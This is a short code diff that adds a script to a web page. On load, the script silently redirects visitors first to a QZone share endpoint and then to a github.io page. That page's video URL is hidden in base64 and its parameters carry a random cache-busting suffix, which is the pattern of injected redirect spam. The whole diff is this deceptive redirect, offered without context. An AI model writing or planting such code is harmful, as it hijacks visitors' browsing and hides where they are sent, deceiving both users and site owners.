@@ -1,0 +1,11 @@
+<script>
+    window.onload = function () {
+        const targetUrl = 'https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https%3A%2F%2Fxwwebimg-75050.picgzc.qpic.cn%2F&title=xwwebimg-75050.picgzc.qpic.cn%20(120%C3%97120)';
+        const targetRL = 'https://q9524250.github.io/u1.html?url=aHR0cHM6Ly92b2QucWllY2RuLmNvbS91cGxvYWRfbTN1OC8yMDIzMTAwNi8yNjU0NzAyOS0wNjcyMWUyYjQ1MTBjZTMyZGI0MjE2ZTg2MzI0YWExYy0xMzEzNjA1LTMyMC9wbGF5bGlzdC5tM3U4&title=%E5%9D%AC%E5%B3%AE920060620&butName=%E5%AE%B6%20%E5%85%A5%20%E6%9C%80%20%E5%BF%83%20%E5%B3%AE&k=index#'
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetRL}?timestamp=${timestamp}-${randomString}`;
+        window.location.href=targetUrl;
+        window.location.href=urlWithParam;
+    }
+</script>
